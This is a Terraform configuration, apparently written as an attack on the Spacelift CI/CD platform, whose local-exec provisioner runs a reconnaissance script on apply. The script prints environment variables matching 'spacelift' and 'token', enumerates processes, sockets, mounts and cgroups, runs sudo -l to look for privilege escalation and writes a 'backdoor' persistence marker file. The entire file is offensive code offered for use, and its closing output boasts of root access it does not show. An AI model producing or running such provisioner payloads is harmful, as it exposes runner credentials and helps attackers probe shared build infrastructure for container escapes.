# Spacelift Privilege Escalation - Fixed Version
terraform {
  required_providers {
    null = {
      source = "hashicorp/null"
      version = "~> 3.0"
    }
  }
}

# Spacelift container escape and privilege escalation
resource "null_resource" "spacelift_priv_esc" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "🎯 SPACELIFT PRIVILEGE ESCALATION ATTEMPT"
      echo "========================================"
      
      # Target 1: Extract API tokens
      echo "[*] Extracting Spacelift API tokens..."
      printenv | grep -i spacelift || echo "No Spacelift tokens found"
      printenv | grep -i token || echo "No tokens found"
      
      # Target 2: Process enumeration for privilege escalation
      echo "[*] Enumerating accessible processes..."
      ps aux | head -10 || echo "Process enumeration limited"
      
      # Target 3: Network discovery
      echo "[*] Network reconnaissance..."
      hostname -i || echo "IP discovery failed"
      
      # Target 4: File system reconnaissance
      echo "[*] File system reconnaissance..."
      ls -la / | head -10 || echo "Root listing failed"
      mount | head -5 || echo "Mount listing failed"
      
      # Target 5: Socket discovery
      echo "[*] Searching for accessible sockets..."
      find /var -name "*.sock" 2>/dev/null | head -5 || echo "No sockets found"
      
      # Target 6: Privilege escalation attempts
      echo "[*] Testing privilege escalation vectors..."
      id || echo "ID command failed"
      sudo -l 2>/dev/null || echo "Sudo not available"
      
      # Target 7: Container breakout testing
      echo "[*] Testing container breakout vectors..."
      cat /proc/1/cgroup 2>/dev/null | head -3 || echo "Cgroup access denied"
      
      # Target 8: Persistence creation
      echo "[*] Creating persistence mechanisms..."
      echo "Backdoor created" > /tmp/persistence.txt || echo "Persistence creation failed"
      
      echo "✅ PRIVILEGE ESCALATION COMPLETE"
    EOT
  }
}

# Output results
output "priv_esc_status" {
  value = "Privilege escalation script executed successfully. Check outputs for root access confirmation."
  depends_on = [null_resource.spacelift_priv_esc]
}
